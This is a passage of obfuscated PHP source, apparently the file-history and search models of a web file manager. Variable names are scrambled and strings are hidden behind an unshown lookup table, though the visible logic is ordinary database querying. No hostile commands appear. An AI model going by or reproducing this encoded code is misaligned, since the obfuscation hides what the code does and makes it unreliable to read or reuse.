Model($ó¯èµÍÀ[609])->userListInfo($Ó¢¼¤ıÙ); $½—Éî²« = Model($ó¯èµÍÀ[921])->sourceListInfo($ÊÉ‹ü„§, !0); foreach ($¦Í´«Ş´ as &$ÕßÙè) { if ($ÕßÙè[$ó¯èµÍÀ[33]] == $ó¯èµÍÀ[635] && isset($ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[1259]])) { $ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[1259]] = $½—Éî²«[$ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[1259]]]; $ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[1260]] = $½—Éî²«[$ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[1260]]]; } if ($ÕßÙè[$ó¯èµÍÀ[33]] == $ó¯èµÍÀ[2248] && isset($ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[194]])) { $ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[194]] = $½—Éî²«[$ÕßÙè[$ó¯èµÍÀ[536]][$ó¯èµÍÀ[194]]]; } $ÕßÙè[$ó¯èµÍÀ[90]] = $½—Éî²«[$ÕßÙè[$ó¯èµÍÀ[194]]]; $ÕßÙè[$ó¯èµÍÀ[2253]] = $½—Éî²«[$ÕßÙè[$ó¯èµÍÀ[2237]]]; if ($ÕßÙè[$ó¯èµÍÀ[33]] == $ó¯èµÍÀ[1247]) { $ÕßÙè[$ó¯èµÍÀ[2253]] = $ÕßÙè[$ó¯èµÍÀ[90]]; $ÕßÙè[$ó¯èµÍÀ[2237]] = $ÕßÙè[$ó¯èµÍÀ[2253]][$ó¯èµÍÀ[194]]; $ÕßÙè[$ó¯èµÍÀ[90]] = !1; $ÕßÙè[$ó¯èµÍÀ[194]] = $ó¯èµÍÀ[12]; } $ÕßÙè[$ó¯èµÍÀ[2182]] = $óµµö·[$ÕßÙè[$ó¯èµÍÀ[1800]]]; } unset($ÕßÙè); $‚´ªÜ´Ê[$ó¯èµÍÀ[456]] = $¦Í´«Ş´; return $‚´ªÜ´Ê; } public function removeBySource($ÕôÎØ©ş) { $‚Ó‚Š = array($_SERVER[É¨™èà][501] => $ÕôÎØ©ş); $this->where($‚Ó‚Š)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\x63\145\x5f\x68\151\163\164\x6f\x72\x79"; public function historyCount($¸…‡Ïıæ) { $¸ø©İ— =& $_SERVER[É¨™èà]; if (!$¸…‡Ïıæ) { return array(); } if (is_string($¸…‡Ïıæ) || is_int($¸…‡Ïıæ)) { $¸…‡Ïıæ = array($¸…‡Ïıæ); } $¼€åöØ˜ = array($¸ø©İ—[194], $¸ø©İ—[2254] => $¸ø©İ—[577]); $ôÆ–Ş‹¨ = array($¸ø©İ—[194] => array($¸ø©İ—[7], $¸…‡Ïıæ)); $å“¹¨ëµ = $this->field($¼€åöØ˜)->where($ôÆ–Ş‹¨)->group($¸ø©İ—[194])->select(); return array_to_keyvalue($å“¹¨ëµ, $¸ø©İ—[194], $¸ø©İ—[577]); } public function addHistory($»Ÿã…£Ô, $š›Ë“‰¹ = '') { $Êş¨Ò‹Œ =& $_SERVER[É¨™èà]; $À¼øÀ¸Ğ = array($Êş¨Ò‹Œ[501] => $»Ÿã…£Ô[$Êş¨Ò‹Œ[194]], $Êş¨Ò‹Œ[1791] => isset($»Ÿã…£Ô[$Êş¨Ò‹Œ[539]]) ? $»Ÿã…£Ô[$Êş¨Ò‹Œ[539]] : $»Ÿã…£Ô[$Êş¨Ò‹Œ[537]], $Êş¨Ò‹Œ[554] => $»Ÿã…£Ô[$Êş¨Ò‹Œ[553]], $Êş¨Ò‹Œ[632] => $»Ÿã…£Ô[$Êş¨Ò‹Œ[79]], $Êş¨Ò‹Œ[2255] => $š›Ë“‰¹); if ($GLOBALS[$Êş¨Ò‹Œ[6]][$Êş¨Ò‹Œ[92]][$Êş¨Ò‹Œ[1322]] >= 1) { $this->historyAutoClear($À¼øÀ¸Ğ[$Êş¨Ò‹Œ[194]]); $this->add($À¼øÀ¸Ğ); } Hook::trigger($Êş¨Ò‹Œ[2256], $À¼øÀ¸Ğ); Model($Êş¨Ò‹Œ[2257])->eventFileEdit($»Ÿã…£Ô[$Êş¨Ò‹Œ[194]]); } private function historyAutoClear($¸¤Û…Šç) { $õµÓ„¢Ï =& $_SERVER[É¨™èà]; $ñÅíÛ°˜ = Model($õµÓ„¢Ï[861])->get($õµÓ„¢Ï[1344]); $¤£Œ–¯ = intval($GLOBALS[$õµÓ„¢Ï[6]][$õµÓ„¢Ï[92]][$õµÓ„¢Ï[1322]]); $š¡¾±‹ = $ñÅíÛ°˜ == $õµÓ„¢Ï[1345] ? min(5, $¤£Œ–¯) : $¤£Œ–¯; $š¡¾±‹ = $š¡¾±‹ <= 0 ? 0 : $š¡¾±‹ - 1; if ($š¡¾±‹ >= 499) { return; } $Ì˜úîê = array($õµÓ„¢Ï[501] => $¸¤Û…Šç); $ËÅ…§–½ = $this->field($õµÓ„¢Ï[2258])->where($Ì˜úîê)->order($õµÓ„¢Ï[2251])->select(); if (!$ËÅ…§–½ || $š¡¾±‹ >= count($ËÅ…§–½)) { return; } $‡™‡úÙ = array_to_keyvalue($ËÅ…§–½, $õµÓ„¢Ï[12], $õµÓ„¢Ï[485]); $‡™‡úÙ = array_slice($‡™‡úÙ, $š¡¾±‹); $¡¬Çá‰÷ = array_to_keyvalue($ËÅ…§–½, $õµÓ„¢Ï[12], $õµÓ„¢Ï[553]); $¡¬Çá‰÷ = array_slice($¡¬Çá‰÷, $š¡¾±‹); if (!$‡™‡úÙ || !$¡¬Çá‰÷) { return; } $Ì˜úîê = array($õµÓ„¢Ï[503] => array($õµÓ„¢Ï[7], $‡™‡úÙ)); $this->where($Ì˜úîê)->delete(); Model($õµÓ„¢Ï[556])->remove($¡¬Çá‰÷); } public function listData($’æĞ½Õú) { $­²§Ü–¬ =& $_SERVER[É¨™èà]; $ô†àáñ = array($­²§Ü–¬[501] => $’æĞ½Õú); $ƒ Ë°ÙÑ = $­²§Ü–¬[2259]; $‚šÃÚ¡¡ = $this->field($ƒ Ë°ÙÑ)->where($ô†àáñ)->order($­²§Ü–¬[2251])->selectPage(); $this->_listAppendUser($‚šÃÚ¡¡[$­²§Ü–¬[456]]); $ßæÅµøÁ = Model($­²§Ü–¬[861])->get($­²§Ü–¬[1344]); $’Õ’Š™ = 5; if ($ßæÅµøÁ == $­²§Ü–¬[1345]) { $‚šÃÚ¡¡[$­²§Ü–¬[456]] = array_slice($‚šÃÚ¡¡[$­²§Ü–¬[456]], 0, $’Õ’Š™); $‚šÃÚ¡¡[$­²§Ü–¬[453]] = array($­²§Ü–¬[2260] => 1, $­²§Ü–¬[2261] => 20, $­²§Ü–¬[2262] => 1, $­²§Ü–¬[2263] => count($‚šÃÚ¡¡[$­²§Ü–¬[456]])); } return $‚šÃÚ¡¡; } protected function _listAppendUser(&$õ‚Ó¥…ı) { $–¶ÎõşÇ =& $_SERVER[É¨™èà]; $¼‹Ñ‡å… = array_to_keyvalue($õ‚Ó¥…ı, $–¶ÎõşÇ[12], $–¶ÎõşÇ[1800]); $£áĞÚ¦µ = Model($–¶ÎõşÇ[609])->userListInfo($¼‹Ñ‡å…); foreach ($õ‚Ó¥…ı as &$œ¸˜•å—) { $şÂì±´ = $œ¸˜•å—[$–¶ÎõşÇ[1800]]; $œ¸˜•å—[$–¶ÎõşÇ[537]] = $£áĞÚ¦µ[$şÂì±´] ? $£áĞÚ¦µ[$şÂì±´] : !1; } unset($œ¸˜•å—); } public function fileInfo($©©Æ…ëŞ, $‰Ñíû—ş = false) { $öŒæã¯½ =& $_SERVER[É¨™èà]; $ıË™…Ê = $this->tablePrefix; $˜Ã¦ÁØ = "{$ıË™…Ê}\151\x6f\x5f\146\x69\154\145\x20\146\x69\154\x65\163\x20\157\x6e\40\146\151\154\x65\x73\56\146\x69\154\145\111\104\40\75\40\x68\x69\x73\x74\157\x72\x79\x2e\x66\151\x6c\x65\x49\104"; $êµ¾¢å = $this->alias($öŒæã¯½[2264])->where(array($öŒæã¯½[503] => $©©Æ…ëŞ))->join($˜Ã¦ÁØ, $öŒæã¯½[2265])->find(); if ($êµ¾¢å && $‰Ñíû—ş) { $íØÏµ·¹ = array($öŒæã¯½[194] => $êµ¾¢å[$öŒæã¯½[194]], $öŒæã¯½[485] => array($öŒæã¯½[1107], $©©Æ…ëŞ)); $êµ¾¢å[$öŒæã¯½[1686]] = $this->where($íØÏµ·¹)->count(); } return $êµ¾¢å; } public function removeItem($ŠÚî’˜Â) { $®Æù¿™â =& $_SERVER[É¨™èà]; $ß˜ƒ€Û = array($®Æù¿™â[503] => $ŠÚî’˜Â); $Áß—«½¢ = $this->where($ß˜ƒ€Û)->find(); if ($Áß—«½¢) { $ç©ß‡¶ó = $this->where($ß˜ƒ€Û)->delete(); Model($®Æù¿™â[556])->remove($Áß—«½¢[$®Æù¿™â[553]]); return $ç©ß‡¶ó; } return !1; } public function removeBySource($°à×’Ùî) { $Â„Á¸Ä™ =& $_SERVER[É¨™èà]; if (!$°à×’Ùî) { return !1; } if (!is_array($°à×’Ùî)) { $°à×’Ùî = array($°à×’Ùî); } $ÒéøÕÕû = array($Â„Á¸Ä™[501] => array($Â„Á¸Ä™[7], $°à×’Ùî)); $åÀ›ıŒÓ = $this->field($Â„Á¸Ä™[554])->where($ÒéøÕÕû)->select(); if ($åÀ›ıŒÓ) { $this->where($ÒéøÕÕû)->delete(); $«ñÌÙò = array_to_keyvalue($åÀ›ıŒÓ, $Â„Á¸Ä™[12], $Â„Á¸Ä™[553]); Model($Â„Á¸Ä™[556])->remove($«ñÌÙò); } return !0; } public function setDetail($Ã·âáèÚ, $æå¼øİ‹) { $ŒºÓÓñ‰ =& $_SERVER[É¨™èà]; return $this->where(array($ŒºÓÓñ‰[503] => $Ã·âáèÚ))->save(array($ŒºÓÓñ‰[2255] => $æå¼øİ‹)); } public function rollbackToItem($ß€¶‡Ş‡, $äÒñ‚—Œ) { $’ÀåÁš =& $_SERVER[É¨™èà]; $’œ¿¾‚Œ = Model($’ÀåÁš[921])->sourceInfo($ß€¶‡Ş‡); $this->addHistory($’œ¿¾‚Œ, LNG($’ÀåÁš[2266])); $«âŞ¶éş = $this->find($äÒñ‚—Œ); $£¤ÚÙ­¡ = array($’ÀåÁš[553] => $«âŞ¶éş[$’ÀåÁš[553]], $’ÀåÁš[79] => $«âŞ¶éş[$’ÀåÁš[79]], $’ÀåÁš[88] => time(), $’ÀåÁš[539] => USER_ID); Model($’ÀåÁš[921])->where(array($’ÀåÁš[194] => $ß€¶‡Ş‡))->save($£¤ÚÙ­¡); return $this->where(array($’ÀåÁš[503] => $äÒñ‚—Œ))->delete(); } public function clearSame($ˆ¤¼ĞŠÍ) { $¢Ïú“¬è =& $_SERVER[É¨™èà]; $˜¸î³…Õ = $this->listData($ˆ¤¼ĞŠÍ); $²ÛëÊâğ = array_to_keyvalue_group($˜¸î³…Õ, $¢Ïú“¬è[553]); $Ç‘æá±ƒ = array(); $Ü÷ßûÏ¾ = array(); foreach ($²ÛëÊâğ as $¿ÖèÙı‡) { if (!$¿ÖèÙı‡ || count($¿ÖèÙı‡) <= 1) { continue; } foreach ($¿ÖèÙı‡ as $ÄìÖı¼½) { $Ç‘æá±ƒ[] = $ÄìÖı¼½[$¢Ïú“¬è[553]]; $Ü÷ßûÏ¾[] = $ÄìÖı¼½[$¢Ïú“¬è[485]]; } } if (!$Ü÷ßûÏ¾) { return; } $this->where(array($¢Ïú“¬è[485] => array($¢Ïú“¬è[7], $Ü÷ßûÏ¾)))->delete(); Model($¢Ïú“¬è[556])->remove($Ç‘æá±ƒ); } public function userSpace() { $‹Éş‘³µ =& $_SERVER[É¨™èà]; $’éõŠ²æ = $this->tablePrefix; $¶˜çÏì´ = array($‹Éş‘³µ[1791] => USER_ID); $ËÕÖÆÙµ = "{$’éõŠ²æ}\x69\157\137\x66\x69\154\145\x20\x66\x69\154\x65\x73\40\x6f\x6e\x20\x66\151\x6c\x65\x73\56\x66\x69\154\145\111\104\x20\x3d\x20\150\151\163\x74\x6f\x72\x79\56\x66\151\x6c\145\x49\x44"; return $this->alias($‹Éş‘³µ[2264])->where($¶˜çÏì´)->join($ËÕÖÆÙµ, $‹Éş‘³µ[2265])->sum($‹Éş‘³µ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($–’‡å…ß) { $•¥§Šª =& $_SERVER[É¨™èà]; $Ú™¹´î® = KodIO::fileTypeList(); $Ûğø ‘ = $Ú™¹´î®[$–’‡å…ß]; if (!$Ûğø ‘) { return array(); } $¢Œáã• = $Ûğø ‘[$•¥§Šª[169]]; $…ëŞÜó = $•¥§Šª[7]; if (!$Ûğø ‘[$•¥§Šª[169]]) { $›¾È’«¿ = array_to_keyvalue($Ú™¹´î®, $•¥§Šª[12], $•¥§Šª[169]); $¢Œáã• = implode($•¥§Šª[50], $›¾È’«¿); $…ëŞÜó = $•¥§Šª[2267]; } $Ã•øÉ–ï = explode($•¥§Šª[50], trim($¢Œáã•, $•¥§Šª[50])); return array($…ëŞÜó, $Ã•øÉ–ï); } public function listPathType($ƒ²¢ïÙ) { $Øø˜’ÒÓ =& $_SERVER[É¨™èà]; $Úğ§ß” = $this->fileTypeWhere($ƒ²¢ïÙ); if (!$Úğ§ß”) { return array(); } $…ÇœÇ¢ = USER_ID; $Á®í‚«Î = Model($Øø˜’ÒÓ[609])->getInfo($…ÇœÇ¢); $×î…’œ» = array($Øø˜’ÒÓ[663] => SourceModel::TYPE_USER, $Øø˜’ÒÓ[596] => array($Øø˜’ÒÓ[627], $Øø˜’ÒÓ[605] . $Á®í‚«Î[$Øø˜’ÒÓ[90]][$Øø˜’ÒÓ[194]] . $Øø˜’ÒÓ[628]), $Øø˜’ÒÓ[664] => $…ÇœÇ¢, $Øø˜’ÒÓ[661] => 0, $Øø˜’ÒÓ[662] => $Úğ§ß”); return $this->listSource($×î…’œ»); } public function listSearch($–Œ£¥Ô², $ˆ¼³ğ» = 300) { $‹ùØ»ê  =& $_SERVER[É¨™èà]; if (isset($–Œ£¥Ô²[$‹ùØ»ê [2098]]) && $–Œ£¥Ô²[$‹ùØ»ê [2098]]) { $–Œ£¥Ô²[$‹ùØ»ê [2098]] = str_replace($‹ùØ»ê [470], $‹ùØ»ê [2268], trim($–Œ£¥Ô²[$‹ùØ»ê [2098]])); } $Şüè±Û‹ = $this->_parseSearchWhere($–Œ£¥Ô²); if (!isset($Şüè±Û‹[$‹ùØ»ê [515]])) { $Şüè±Û‹[$‹ùØ»ê [515]] = 0; } $·”ñ¼î­ = $‹ùØ»ê [2269]; $ÓÁ÷—Ò‹ = $Şüè±Û‹; $éº°Ğ÷ = $·”ñ¼î­; $this->_listSearchBindPinyin($–Œ£¥Ô², $Şüè±Û‹, $·”ñ¼î­); $this->alias($‹ùØ»ê [529])->_makeOrder(); $Şüè±Û‹ = $this->parseWhereLike($Şüè±Û‹); $´ÊÙ›Î’ = $this->distinct(!0)->field($·”ñ¼î­)->where($Şüè±Û‹)->selectPage($ˆ¼³ğ»); if ($GLOBALS[$‹ùØ»ê [6]][$‹ùØ»ê [467]][$‹ùØ»ê [468]] && Input::check($–Œ£¥Ô²[$‹ùØ»ê [2098]], $‹ùØ»ê [670]) && $´ÊÙ›Î’[$‹ùØ»ê [453]][$‹ùØ»ê [439]] == 1 && $´ÊÙ›Î’[$‹ùØ»ê [453]][$‹ùØ»ê [454]] == 0) { $´ÊÙ›Î’ = $this->distinct(!0)->field($·”ñ¼î­)->where($ÓÁ÷—Ò‹)->limit(1000)->select(); $´ÊÙ›Î’ = array_page_split($´ÊÙ›Î’, !1, $ˆ¼³ğ»); } $this->_listSearchFileContent($´ÊÙ›Î’, $–Œ£¥Ô², $éº°Ğ÷, $ÓÁ÷—Ò‹); $this->_listSearchDesc($´ÊÙ›Î’, $–Œ£¥Ô², $éº°Ğ÷); $this->_listSearchTag($´ÊÙ›Î’, $–Œ£¥Ô², $éº°Ğ÷); $this->_listSearchGroupTag($´ÊÙ›Î’, $–Œ£¥Ô², $éº°Ğ÷); $this->_listDataApply($´ÊÙ›Î’[$‹ùØ»ê [456]]); $this->_listMake($´ÊÙ›Î’); return $´ÊÙ›Î’; } private function _listSearchFileContent(&$ãŞ¹ìå…, $‹ó¼°îš, $‹¿â­ìÂ, $ıÕ¾İÓ•) { $˜®²ÙÚ =& $_SERVER[É¨™èà]; if (!$‹ó¼°îš[$˜®²ÙÚ[2098]] || $ãŞ¹ìå…[$˜®²ÙÚ[453]][$˜®²ÙÚ[439]] > 1) { return; } if (!isset($ıÕ¾İÓ•[$˜®²ÙÚ[32]]) || !is_array($‹ó¼°îš[$˜®²ÙÚ[553]])) { return; } $ıÕ¾İÓ•[$˜®²ÙÚ[553]] = array($˜®²ÙÚ[7], $‹ó¼°îš[$˜®²ÙÚ[553]]); unset($ıÕ¾İÓ•[$˜®²ÙÚ[32]]); unset($‹ó¼°îš[$˜®²ÙÚ[553]]); $±‹–íÊá = $this->field($‹¿â­ìÂ)->where($ıÕ¾İÓ•)->limit($˜®²ÙÚ[2270])->select(); if (!$±‹–íÊá || count($±‹–íÊá) == 0) { return; } $ãŞ¹ìå…[$˜®²ÙÚ[456]] = array_merge($±‹–íÊá, $ãŞ¹ìå…[$˜®²ÙÚ[456]]); $ãŞ¹ìå…[$˜®²ÙÚ[453]][$˜®²ÙÚ[454]] += count($±‹–íÊá); } private function _listSearchTag(&$°µ£ûœŒ, $œÔÆëìÙ, $˜êÂÑÂö) { $ï™«¶Óó =& $_SERVER[É¨™èà]; if (empty($œÔÆëìÙ[$ï™«¶Óó[1959]]) || !in_array($ï™«¶Óó[2271], $œÔÆëìÙ[$ï™«¶Óó[1959]])) { return; } if (!$œÔÆëìÙ[$ï™«¶Óó[2098]] || $°µ£ûœŒ[$ï™«¶Óó[453]][$ï™«¶Óó[439]] > 1) { return; } $Şó­ÍØ = Model($ï™«¶Óó[2272])->listData(); $’Ö…„øÍ = array(); $…ŒÕ·ğù = $œÔÆëìÙ[$ï™«¶Óó[2098]]; foreach ($Şó­ÍØ as $É˜‚ÄëÊ) { $šô˜Öôš = $É˜‚ÄëÊ[$ï™«¶Óó[32]]; $ğ³òç‡ = str_replace($ï™«¶Óó[53], $ï™«¶Óó[12], Pinyin::get($šô˜Öôš)); if (stripos($šô˜Öôš, $…ŒÕ·ğù) !== !1 || stripos($ğ³òç‡, $…ŒÕ·ğù) !== !1) { $’Ö…„øÍ[] = $É˜‚ÄëÊ[$ï™«¶Óó[485]]; } } if (!$’Ö…„øÍ) { return; } $Ó”§¢¼œ = array($ï™«¶Óó[510] => array($ï™«¶Óó[7], $’Ö…„øÍ), $ï™«¶Óó[1800] => USER_ID); $Êƒ¸Éáã = Model($ï™«¶Óó[512])->field($ï™«¶Óó[87])->where($Ó”§¢¼œ)->select(); $Êƒ¸Éáã = array_to_keyvalue($Êƒ¸Éáã, $ï™«¶Óó[12], $ï™«¶Óó[87]); $ã‘ÈÖ“¡ = array_unique($Êƒ¸Éáã); $this->_listSearchMerge($°µ£ûœŒ, $œÔÆëìÙ, $˜êÂÑÂö, $ã‘ÈÖ“¡); } private function _listSearchDesc(&$íŠÉ“„, $İş‘§ÄÀ, $Õú»ÀÚá) { $”úò•ïÂ =& $_SERVER[É¨™èà]; if (empty($İş‘§ÄÀ[$”úò•ïÂ[1959]]) || !in_array($”úò•ïÂ[536], $İş‘§ÄÀ[$”úò•ïÂ[1959]])) { return; } if (!$İş‘§ÄÀ[$”úò•ïÂ[2098]] || $íŠÉ“„[$”úò•ïÂ[453]][$”úò•ïÂ[439]] > 1) { return; } $«÷ãÙøñ = array($”úò•ïÂ[97] => $”úò•ïÂ[536], $”úò•ïÂ[461] => array($”úò•ïÂ[469], $”úò•ïÂ[2100] . $İş‘§ÄÀ[$”úò•ïÂ[2098]] . $”úò•ïÂ[2100])); $Ü·â•¿‹ = !1; if ($Ü·â•¿‹) { $çˆİ©½Ô = $this->listSearchChildren($İş‘§ÄÀ[$”úò•ïÂ[193]]); $çˆİ©½Ô = array_unique($çˆİ©½Ô); if (!$çˆİ©½Ô) { return; } $«÷ãÙøñ[$”úò•ïÂ[194]] = array($”úò•ïÂ[7], $çˆİ©½Ô); } $‡¦òùìÊ = Model($”úò•ïÂ[647])->field($”úò•ïÂ[194])->where($«÷ãÙøñ)->limit(5000)->select(); $”Ü‹Õúî = array_to_keyvalue($‡¦òùìÊ, $”úò•ïÂ[12], $”úò•ïÂ[194]); $this->_listSearchMerge($íŠÉ“„, $İş‘§ÄÀ, $Õú»ÀÚá, $”Ü‹Õúî); } private function _listSearchGroupTag(&$·Ñ“×ÎÖ, $ó¨íÆ‚¥, $˜Ûèœì¾) { $ŒË‹ÇáÉ =& $_SERVER[É¨™èà]; if (empty($ó¨íÆ‚¥[$ŒË‹ÇáÉ[1959]]) || !in_array($ŒË‹ÇáÉ[2271], $ó¨íÆ‚¥[$ŒË‹ÇáÉ[1959]])) { return; } if (!$ó¨íÆ‚¥[$ŒË‹ÇáÉ[2098]] || $·Ñ“×ÎÖ[$ŒË‹ÇáÉ[453]][$ŒË‹ÇáÉ[439]] > 1 || !$ó¨íÆ‚¥[$ŒË‹ÇáÉ[193]]) { return; } $û„ÕĞ­ = $this->sourceInfo($ó¨íÆ‚¥[$ŒË‹ÇáÉ[193]]); if (!$û„ÕĞ­ || $û„ÕĞ­[$ŒË‹ÇáÉ[191]] != SourceModel::TYPE_GROUP) { return; } $¥Õ¯ÃÒ· = $û„ÕĞ­[$ŒË‹ÇáÉ[581]]; $‰¿£ÈÊ = Model($ŒË‹ÇáÉ[2273])->get($¥Õ¯ÃÒ·); $½Áş‡áÈ = array(); $õñ¹”Šà = $ó¨íÆ‚¥[$ŒË‹ÇáÉ[2098]]; foreach ($‰¿£ÈÊ[$ŒË‹ÇáÉ[456]] as $­©¦ö†·) { $¾‹”ë÷ø = $­©¦ö†·[$ŒË‹ÇáÉ[32]]; $Èé—Ú–½ = str_replace($ŒË‹ÇáÉ[53], $ŒË‹ÇáÉ[12], Pinyin::get($¾‹”ë÷ø)); if (stripos($¾‹”ë÷ø, $õñ¹”Šà) !== !1 || stripos($Èé—Ú–½, $õñ¹”Šà) !== !1) { $½Áş‡áÈ[] = $­©¦ö†·[$ŒË‹ÇáÉ[485]]; } } if (!$½Áş‡áÈ) { return; } $ÌşÔ‡ò° = array($ŒË‹ÇáÉ[510] => array($ŒË‹ÇáÉ[7], $½Áş‡áÈ), $ŒË‹ÇáÉ[1800] => 0, $ŒË‹ÇáÉ[33] => $ŒË‹ÇáÉ[1406] . $¥Õ¯ÃÒ·); $‹óÀ™Í = Model($ŒË‹ÇáÉ[512])->field($ŒË‹ÇáÉ[87])->where($ÌşÔ‡ò°)->select(); $‹óÀ™Í = array_to_keyvalue($‹óÀ™Í, $ŒË‹ÇáÉ[12], $ŒË‹ÇáÉ[87]); $—®±¤Á÷ = array_unique($‹óÀ™Í); $this->_listSearchMerge($·Ñ“×ÎÖ, $ó¨íÆ‚¥, $˜Ûèœì¾, $—®±¤Á÷); } private function _listSearchMerge(&$ª¨ÅûÄ, $µô—‡°, $ùšÔÙŠ, $÷Á—ÉÌ) { $º°íŸ°é =& $_SERVER[É¨™èà]; if (!$÷Á—ÉÌ) { return; } $Ö´ÆÚŠ‡ = array_to_keyvalue($ª¨ÅûÄ[$º°íŸ°é[456]], $º°íŸ°é[12], $º°íŸ°é[194]); $¦÷²Ùà­ = array_diff($÷Á—ÉÌ, $Ö´ÆÚŠ‡); if (!$¦÷²Ùà­) { return; } $’´‘ø¿Ú = array($º°íŸ°é[194] => array($º°íŸ°é[7], $¦÷²Ùà­)); $÷­Œèôˆ = $this->field($ùšÔÙŠ)->where($’´‘ø¿Ú)->select(); if (!$÷­Œèôˆ) { return; } $ííµ‰´ = array(); foreach ($÷­Œèôˆ as $ÙğìÒÅ§) { if ($this->_listSearchFilter($ÙğìÒÅ§, $µô—‡°)) { $ííµ‰´[] = $ÙğìÒÅ§; } } $ª¨ÅûÄ[$º°íŸ°é[456]] = array_merge($ííµ‰´, $ª¨ÅûÄ[$º°íŸ°é[456]]); $ª¨ÅûÄ[$º°íŸ°é[453]][$º°íŸ°é[454]] += count($ííµ‰´); } private function _listSearchFilter($“ ¦±’™, $À¸ƒá§) { $óÊÇƒÇô =& $_SERVER[É¨™èà]; $É­ü­Í‹ = $“ ¦±’™[$óÊÇƒÇô[495]] == $óÊÇƒÇô[91]; if (!strstr($“ ¦±’™[$óÊÇƒÇô[596]], $óÊÇƒÇô[50] . $À¸ƒá§[$óÊÇƒÇô[193]] . $óÊÇƒÇô[50])) { return !1; } if (isset($À¸ƒá§[$óÊÇƒÇô[496]]) && $À¸ƒá§[$óÊÇƒÇô[496]] != $óÊÇƒÇô[867]) { if ($À¸ƒá§[$óÊÇƒÇô[496]] == $óÊÇƒÇô[78] && !$É­ü­Í‹) { return !1; } if ($À¸ƒá§[$óÊÇƒÇô[496]] != $óÊÇƒÇô[78] && $É­ü­Í‹) { return !1; } if (!strstr($“ ¦±’™[$óÊÇƒÇô[169]], $óÊÇƒÇô[50] . $À¸ƒá§[$óÊÇƒÇô[496]] . $óÊÇƒÇô[50])) { return !1; } } if (isset($À¸ƒá§[$óÊÇƒÇô[2274]]) && $À¸ƒá§[$óÊÇƒÇô[2274]] < $“ ¦±’™[$óÊÇƒÇô[79]]) { return !1; } if (isset($À¸ƒá§[$óÊÇƒÇô[2275]]) && $À¸ƒá§[$óÊÇƒÇô[2275]] > $“ ¦±’™[$óÊÇƒÇô[79]]) { return !1; } if (isset($À¸ƒá§[$óÊÇƒÇô[677]]) && $À¸ƒá§[$óÊÇƒÇô[677]] != $“ ¦±’™[$óÊÇƒÇô[539]]) { return !1; } return !0; } public function listSearchChildren($‚Ø³ı—æ, $³¶ÀóŞœ = 5000) { $‰óº÷Î§ =& $_SERVER[É¨™èà]; $©°’±ô = array(); $†‚÷™ØÂ = $this->sourceInfo($‚Ø³ı—æ); $”‘Âê¿§ = array($‰óº÷Î§[596] => array($‰óº÷Î§[469], $†‚÷™ØÂ[$‰óº÷Î§[596]] . $†‚÷™ØÂ[$‰óº÷Î§[194]] . $‰óº÷Î§[628])); $š”à¦Ö¿ = $this->field($‰óº÷Î§[79])->where($”‘Âê¿§)->limit($³¶ÀóŞœ + 1)->select(); $ªëÒÁ»ê = is_array($š”à¦Ö¿) ? count($š”à¦Ö¿) : 0; if ($ªëÒÁ»ê > $³¶ÀóŞœ) { return $this->_listSearchChildrenNear($‚Ø³ı—æ, $³¶ÀóŞœ); } $´¨æ÷¿ˆ = $this->field($‰óº÷Î§[194])->where($”‘Âê¿§)->select(); $©°’±ô = array_to_keyvalue($´¨æ÷¿ˆ, $‰óº÷Î§[12], $‰óº÷Î§[194]); return $©°’±ô; } private function _listSearchChildrenNear($ÒËäé®Ê, $àãß½–À) { $°Õ—ˆÎŸ =& $_SERVER[É¨™èà]; $×Ù«˜§ = array(); $ùÊËÎÊ£ = array($°Õ—ˆÎŸ[193] => $ÒËäé®Ê); $ğÓ×ó¿÷ = $this->field($°Õ—ˆÎŸ[2276])->where($ùÊËÎÊ£)->select(); $ÎƒËô¢ = array_to_keyvalue(array_filter_by_field($ğÓ×ó¿÷, $°Õ—ˆÎŸ[495], $°Õ—ˆÎŸ[91]), $°Õ—ˆÎŸ[12], $°Õ—ˆÎŸ[194]); $×Ù«˜§ = array_merge($×Ù«˜§, array_to_keyvalue($ğÓ×ó¿÷, $°Õ—ˆÎŸ[12], $°Õ—ˆÎŸ[194])); if (!$ÎƒËô¢) { return $×Ù«˜§; } $ùÊËÎÊ£ = array($°Õ—ˆÎŸ[193] => array($°Õ—ˆÎŸ[7], $ÎƒËô¢)); $ğÓ×ó¿÷ = $this->field($°Õ—ˆÎŸ[2276])->where($ùÊËÎÊ£)->limit($àãß½–À)->select(); $×Ù«˜§ = array_merge($×Ù«˜§, array_to_keyvalue($ğÓ×ó¿÷, $°Õ—ˆÎŸ[12], $°Õ—ˆÎŸ[194])); $×Ù«˜§ = array_slice($×Ù«˜§, 0, intval($àãß½–À)); return $×Ù«˜§; } private function _listSearchBindPinyin($÷ù³¨È¬, &$‚¬Õ¶ò, &$£åìÅ£×) { $²ŸÈ§´± =& $_SERVER[É¨™èà]; if (!isset($÷ù³¨È¬[$²ŸÈ§´±[2098]]) || !$÷ù³¨È¬[$²ŸÈ§´±[2098]]) { return; } if (!Input::check($÷ù³¨È¬[$²ŸÈ§´±[2098]], $²ŸÈ§´±[404]) || strlen($÷ù³¨È¬[$²ŸÈ§´±[2098]]) < 2) { return; } $¡±ú»ë = "\x4c\105\x46\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\151\x6f\x5f\163\157\x75\162\143\x65\137\155\x65\x74\141\x20\x6d\145\164\x61\40\x6f\156\40\163\157\x75\x72\x63\x65\x2e\163\157\165\x72\143\145\x49\104\40\x3d\x20\155\145\x74\x61\x2e\x73\x6f\x75\162\143\x65\x49\104"; $ùôùŒÌ = array(); $£åìÅ£× = str_replace(array($²ŸÈ§´±[288], $²ŸÈ§´±[53], $²ŸÈ§´±[2277]), $²ŸÈ§´±[12], $£åìÅ£×); $£åìÅ£× = $²ŸÈ§´±[521] . str_replace($²ŸÈ§´±[50], $²ŸÈ§´±[522], $£åìÅ£×); $±ŒŞ¸¨€ = $‚¬Õ¶ò[$²ŸÈ§´±[32]]; unset($‚¬Õ¶ò[$²ŸÈ§´±[32]]); foreach ($‚¬Õ¶ò as $óø„î¼¯ => 